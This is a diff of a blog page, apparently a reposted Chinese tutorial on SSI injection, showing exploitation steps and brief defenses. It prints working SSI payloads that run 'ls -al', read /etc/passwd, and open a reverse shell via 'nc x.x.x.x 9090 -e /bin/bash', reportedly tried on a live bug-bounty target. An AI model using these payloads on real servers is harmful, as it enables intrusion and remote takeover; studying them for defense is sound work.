@@ -90,23 +90,39 @@ google dork：'inurl:bin/cklb'
 
 成功执行了代码。
 
-再使用下exec指令使用cmd作为参数执行服务器端命令：'<!--#exec cmd="ls -al"-->'
+再使用下exec指令使用cmd作为参数执行服务器端命令：
 
-<p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p>
-<p><strong>5.2 漏洞挖掘</strong></p>
-<p>运气好，刚好遇到个某SRC的。</p>
+```
+'<!--#exec cmd="ls -al"-->'
+<pre><code>
+![img](ssi服务端包含注入/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png)
+
+**5.2 漏洞挖掘**
+
+运气好，刚好遇到个某SRC的。
+</code></pre>
 <p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="cat /etc/passwd"--></p>
-<p>执行命令</p>
-<p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png" alt="img"></p>
+<pre><code>
+执行命令
+
+![img](ssi服务端包含注入/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70.png)
+
+ 
+</code></pre>
 <p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="nc x.x.x.x 9090 -e /bin/bash"--></p>
-<p>反弹shell</p>
-<p><img src="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70-16341341237378" alt="img"></p>
-<h2 id="0x06-SSI防御"><a href="#0x06-SSI防御" class="headerlink" title="0x06 SSI防御"></a>0x06 SSI防御</h2><ul>
-<li>关闭服务器SSI功能</li>
-<li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li>
-</ul>
-<p> 转载自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40657585/article/details/84260844">https://blog.csdn.net/qq_40657585/article/details/84260844</a></p>
-</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">https://sakurahack-y.github.io/2021/10/13/ssi服务端包含注入/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/ssi/">ssi</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SSI注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-SSI%E9%98%B2%E5%BE%A1"><span class="toc-number">1.1.</span> <span class="toc-text">0x06 SSI防御</span></a></li></ol></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2021/10/13/MRCTF2020-Ezpop/">MRCTF2020-Ezpop &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+<pre><code>
+反弹shell
+
+![img](ssi服务端包含注入/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjU3NTg1,size_16,color_FFFFFF,t_70-16341341237378)
+
+## 0x06 SSI防御
+
+- 关闭服务器SSI功能
+- 过滤相关SSI特殊字符（`&lt;,&gt;,#,-,&quot;,&#39;`）
+
+ 转载自：https://blog.csdn.net/qq_40657585/article/details/84260844
+</code></pre>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">John Doe</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2021/10/13/ssi%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/">https://sakurahack-y.github.io/2021/10/13/ssi服务端包含注入/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">John Doe的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/ssi/">ssi</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">SSI注入漏洞</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2021/10/13/MRCTF2020-Ezpop/">MRCTF2020-Ezpop &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
 .night .v[data-class=v] a:hover { color: #216C73 !important; }
 .night .v[data-class=v] li { list-style: inherit; }
 .night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
